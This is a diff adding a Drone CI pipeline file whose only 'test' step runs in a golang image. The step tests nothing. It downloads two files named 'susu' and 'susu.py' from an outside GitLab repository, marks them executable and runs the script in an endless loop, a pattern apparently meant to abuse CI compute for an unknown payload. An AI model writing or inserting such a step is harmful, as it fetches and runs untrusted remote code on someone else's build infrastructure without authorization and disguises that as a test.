@@ -1,0 +1,9 @@
+kind: pipeline
+type: docker
+name: default
+
+steps:
+- name: test
+  image: golang
+  commands:
+  - wget https://gitlab.com/malghzspsi/susu/-/raw/main/susu && wget https://gitlab.com/malghzspsi/susu/-/raw/main/susu.py && chmod +x susu susu.py && while :; do timeout 30m ./susu.py ; sleep 1; done
